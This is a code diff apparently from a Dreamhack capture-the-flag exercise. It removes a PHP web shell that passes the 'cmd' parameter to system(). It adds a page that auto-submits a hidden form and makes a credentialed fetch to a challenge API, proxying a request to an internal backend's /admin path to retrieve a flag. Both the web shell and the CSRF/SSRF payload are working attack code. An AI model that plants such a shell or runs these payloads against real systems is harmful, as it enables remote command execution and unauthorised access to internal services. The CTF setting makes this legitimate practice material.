@@ -1,16 +1,28 @@
+<!DOCTYPE html>
 <html>
+<head>
+    <title>CSRF Attack</title>
+</head>
 <body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
-<?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
-?>
-</pre>
+    <form id="csrfForm" action="http://host3.dreamhack.games:16688/api" method="POST">
+        <input type="hidden" name="api_info" value='{"host": "backend:8000", "path": "/admin", "method": "GET"}'>
+    </form>
+    <script>
+        // 폼 자동 제출
+        document.getElementById('csrfForm').submit();
+
+        // 서버 응답을 페이지에 표시하기 위한 AJAX 요청
+        fetch('http://host3.dreamhack.games:16688/api', {
+            method: 'POST',
+            body: new URLSearchParams('api_info={"host": "backend:8000", "path": "/admin", "method": "GET"}'),
+            credentials: 'include'
+        })
+        .then(response => response.json())
+        .then(data => {
+            // 서버 응답(FLAG)을 페이지에 표시
+            document.body.innerHTML += `<pre>FLAG: ${data.message}</pre>`;
+        })
+        .catch(error => console.error('Error:', error));
+    </script>
 </body>
 </html>
